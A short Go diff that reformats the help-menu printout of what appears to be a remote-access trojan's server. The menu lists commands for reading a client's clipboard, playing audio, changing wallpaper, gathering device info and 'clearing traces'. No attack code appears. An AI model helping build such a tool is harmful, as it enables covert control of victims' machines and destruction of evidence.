@@ -33,10 +33,10 @@ func options() {
 	fmt.Println("[+] clipboard \t:\tread or write to\\from Client clipboard")
 	fmt.Println("[+] make_noise \t:\tplays audio file from host till told to")
 	fmt.Println("[+] wallpaper \t:\tSet wallpaper from url")
-	fmt.Println("[+] device_info \t:\tDisplays Client info")
+	fmt.Println("[+] device_info :\tDisplays Client info")
 	fmt.Println("[+] appdata \t:\tcd to appdata of user")
 	fmt.Println("[+] clear \t:\tClear terminal screen")
-	fmt.Println("[+] disarm&exit \t:\tClear traces and close connection")
+	fmt.Println("[+] disarm&exit :\tClear traces and close connection")
 	fmt.Println("[+] exit \t:\tExit the Server\n")
 	fmt.Println("=======================================================")
 }
